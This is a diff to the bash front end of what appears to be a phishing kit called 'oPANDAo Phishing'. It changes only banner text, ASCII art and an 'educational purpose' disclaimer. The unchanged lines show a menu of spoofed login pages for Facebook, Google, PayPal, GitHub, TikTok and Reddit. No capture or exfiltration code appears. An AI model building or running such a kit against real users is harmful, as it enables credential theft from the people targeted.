@@ -7,7 +7,7 @@ clear
 echo ""
 echo ""
 echo ""
-read -p $'\e[1;40m\e[96m DO-YOU-KNOW-WHAT-I-AM-? \e[1;91m (Y/N) : \e[0m' option
+read -p $'\e[1;40m\e[96m Y O U   W A N N A   B E   M Y   F R I E N D  ? \e[1;91m (Y/N) : \e[0m' option
 echo""
 echo""
 echo""
@@ -35,10 +35,8 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 
 menu() {
 
-printf "\e[0m\e[1;91m  -----------------------------------------------------------------      ------------------------------------------------------------------          ------------------------------------------------------------------   \e[0m\n"
- 
+printf "\e[0m\e[1;91m  -----------------------------------------------------------------      ------------------------------------------------------------------          ------------------------------------------------------------------   \e[0m\n" 
 printf "\e[0m\e[1;91m  |                       W E B - P A G E S                       |      |                       W E B - P A G E S                       |           |                    W E B - P A G E S (N E W)                   |    \e[0m\n"
-
 printf "\e[0m\e[1;91m  -----------------------------------------------------------------      ------------------------------------------------------------------          ------------------------------------------------------------------    \e[0m\n"
 printf "               \e[1;101m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;0m Facebook\e[0m      \e[1;101m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;0m PayPal\e[0m             \e[1;101m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;0m Tiktok\e[0m            \n"                              
 printf "               \e[1;101m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;0m Google\e[0m        \e[1;101m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;0m Github   \e[0m          \e[1;101m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;0m Reddit\e[0m         \n"
@@ -264,18 +262,22 @@ printf "  \e[0m\e[1;94m                -                            -           
 printf "  \e[0m\e[1;95m                 -                          -                   \e[0m\n"
 printf "  \e[0m\e[1;96m                  --------------------------    oPANDAo Phishing\e[0m\n"
 printf "\n"
-printf "\e[1;77m    ______   _      _        _      _         ___________     \e[0m\n"
-printf "\e[1;77m   (_____ \ | |    (_)      | |    (_)       / |________/     \e[0m\n"
-printf "\e[1;77m    _____) )| | _   _   ___ | | _   _ \_  _  | |     ______   \e[0m\n"
-printf "\e[1;77m   |  ____/ | || \ | | /___)| || \ | || || \ | |    |____  \  \e[0m\n"
-printf "\e[1;77m   | |      | | | || ||___ || | | || || | | || |_____\ | | |  \e[0m\n"
-printf "\e[1;77m   | |      |_| |_||_|(___/ |_| |_||_||_| |_||_________/ |_|  v1.0\e[0m\n"
+printf "\e[1;77m         ______   _      _        _      _         ___________     \e[0m\n"
+printf "\e[1;77m        (_____ \ | |    (_)      | |    (_)       / |________/     \e[0m\n"
+printf "\e[1;77m         _____) )| | _   _   ___ | | _   _ \_  _  | |     ______   \e[0m\n"
+printf "\e[1;77m        |  ____/ | || \ | | /___)| || \ | || || \ | |    |____  \  \e[0m\n"
+printf "\e[1;77m        | |      | | | || ||___ || | | || || | | || |_____\ | | |  \e[0m\n"
+printf "\e[1;77m        | |      |_| |_||_|(___/ |_| |_||_||_| |_||_________/ |_|  v1.0\e[0m\n"
 printf "\n"
-printf "     \e[101m\e[1;77m Disclaimer: Developers assume no liability and are not \e[0m\n"
-printf "                 \e[101m\e[1;77m By @opandao-oo Developer Team \e[0m\n"
-printf "              \e[101m\e[1;77m Only use for educational purporses!! \e[0m\n"
+printf "  \e[0m\e[1;77m     ===================================================            \e[0m\n"
+printf "  \e[0m\e[1;77m                 T O O L   B Y   P A N D A                          \e[0m\n"
+printf "  \e[0m\e[1;77m     ===================================================            \e[0m\n"
+printf "  \e[0m\e[1;77m     +++++++++++GITHUB-PROFILE+++@opandao-oo++++++++++++            \e[0m\n"
+printf "  \e[0m\e[1;77m     ===================================================            \e[0m\n"      
+printf "  \e[0m\e[1;77m            E D U C A T I O N A L   P U R P O S E                   \e[0m\n"
+printf "  \e[0m\e[1;77m     ===================================================            \e[0m\n"
 printf "\n"
-printf "           \e[101m\e[1;77m:: oPANDAo Phishing v1.0! By @opandao-oo :: \e[0m\n"
+printf "  \e[101m\e[1;77m               |   T H A N K   Y O U    |                         \e[0m\n"
 printf "\n"
 }
 
